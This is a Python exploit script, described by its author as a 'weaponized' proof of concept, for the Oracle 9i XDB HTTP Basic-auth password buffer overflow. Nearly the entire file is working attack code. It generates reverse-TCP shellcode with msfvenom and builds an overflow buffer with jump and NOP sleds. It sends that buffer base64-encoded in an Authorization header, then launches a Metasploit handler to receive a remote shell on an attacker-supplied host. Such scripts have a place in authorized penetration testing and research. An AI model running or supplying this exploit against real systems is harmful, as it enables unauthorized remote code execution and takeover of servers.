#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#       ▄▄▄   ▄▄▄·  ▄▄· ▄▄▌  ▄▄▄ .▪  ▐▄• ▄ ·▄▄▄▄  ▄▄▄▄· ·▄▄▄▄▄▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▄   ▄▄· ▄▄▄ .#
#▪     ▀▄ █·▐█ ▀█ ▐█ ▌▪██•  ▀▄.▀·██  █▌█▌▪██▪ ██ ▐█ ▀█▪▐▄▄·•██  ▐█ ▄█▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ▀▄ █·▐█ ▌▪▀▄.▀· #
# ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██ ▄▄██▪  ▐▀▀▪▄▐█· ·██· ▐█· ▐█▌▐█▀▀█▄██▪  ▐█.▪ ██▀· ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐▀▀▄ ██ ▄▄▐▀▀▪▄ #
#▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐███▌▐█▌▐▌▐█▄▄▌▐█▌▪▐█·█▌██. ██ ██▄▪▐███▌. ▐█▌·▐█▪·•▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█•█▌▐███▌▐█▄▄▌ #
# ▀█▄▀▪.▀  ▀ ▀  ▀ ·▀▀▀ .▀▀▀  ▀▀▀ ▀▀▀•▀▀ ▀▀▀▀▀▀▀• ·▀▀▀▀ ▀▀▀  ▀▀▀ .▀   .▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀ .▀  ▀·▀▀▀  ▀▀▀  #
#                                                                                                           #
# oracle9i_xdb_http_pass_rce.py - nighter                                                                    #
#                                                                                                           #
# DATE                                                                                                      #
# 15/02/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Exploits Oracle 9i XDB http password buffer overflow vulnerability                                         #
#   -> http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf                        #
#                                                                                                           #
# Note I have read several versions of this PoC and I have just weaponized it. So cannot take credz for the #
# b0f code                                                                                                  #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import sys
import socket
import time
import os
import base64

from multiprocessing import Process


def build_shellcode():

    print("[+] Build shellcode")
    cmd = """msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s EXITFUNC=thread -a x86 --platform Windows -b "\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40" -f raw -o /tmp/shellcode.bin 2>/dev/null""" % (LHOST, LPORT)
    os.system(cmd)

    if os.path.isfile('/tmp/shellcode.bin') is False:
        print("[-] Generate shellcode failed")
        sys.exit(0)


def exploit():

    # Give time to listener to start.
    time.sleep(5)

    build_shellcode()
    fp = open('/tmp/shellcode.bin', 'rb')
    shellprep = fp.read()
    fp.close()
    os.unlink('/tmp/shellcode.bin')

    payload = "\x6a\x6a\x6a\x6a" + ":" + "\x6a" * 442 + "\xeb\x64" + "\x90" * 2 + "\x46\x6d\x61\x60" + "\x90" * 266 + "\xeb\x10" + "\x90" * 109 + "\x81\xc4\xff\xef\xff\xff\x44" + shellprep

    encodedPayload = base64.b64encode(payload)
    req = "Authorization: Basic " + encodedPayload + "\r\n\r\n"
    res = "GET / HTTP/1.1\r\n" + "Host: " + "%s:%s" % (HOST, PORT) + "\r\n" + req

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect(('%s' % HOST, '%d' % PORT))
        print("[+] Run exploit")
        s.send(res)
        s.recv(1024)
        s.close()
        print("[-] Done! Waiting for listener")
    except:
        print("Could not connect to " + HOST + ":" + str(PORT) + "!")


def start_listener():

    print("[+] Start listener")
    listener = "msfconsole -q -x 'use multi/handler;set PAYLOAD windows/shell/reverse_tcp;set LHOST %s;set LPORT %s;run'" % (LHOST, LPORT)
    os.system(listener)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
      ▄▄▄   ▄▄▄·  ▄▄· ▄▄▌  ▄▄▄ .▪  ▐▄• ▄ ·▄▄▄▄  ▄▄▄▄· ·▄▄▄▄▄▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▄   ▄▄· ▄▄▄ .    
▪     ▀▄ █·▐█ ▀█ ▐█ ▌▪██•  ▀▄.▀·██  █▌█▌▪██▪ ██ ▐█ ▀█▪▐▄▄·•██  ▐█ ▄█▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ▀▄ █·▐█ ▌▪▀▄.▀·    
 ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██ ▄▄██▪  ▐▀▀▪▄▐█· ·██· ▐█· ▐█▌▐█▀▀█▄██▪  ▐█.▪ ██▀· ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐▀▀▄ ██ ▄▄▐▀▀▪▄    
▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐███▌▐█▌▐▌▐█▄▄▌▐█▌▪▐█·█▌██. ██ ██▄▪▐███▌. ▐█▌·▐█▪·•▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█•█▌▐███▌▐█▄▄▌    
 ▀█▄▀▪.▀  ▀ ▀  ▀ ·▀▀▀ .▀▀▀  ▀▀▀ ▀▀▀•▀▀ ▀▀▀▀▀▀▀• ·▀▀▀▀ ▀▀▀  ▀▀▀ .▀   .▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀ .▀  ▀·▀▀▀  ▀▀▀     

    """)
        print("Usage: %s <HOST> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./oracle9i_xdb_http_pass_rce.py '10.10.10.70' 10.10.14.24 1337\n")
        sys.exit(0)

    HOST = sys.argv[1]
    if ':' in HOST:
        (HOST, PORT) = HOST.split(':')
    else:
        PORT = '8080'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    if os.path.isfile('/usr/bin/msfconsole') is False:
       print('[-] Please install metasploit for run this PoC.')
       sys.exit(1)

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    start_listener()

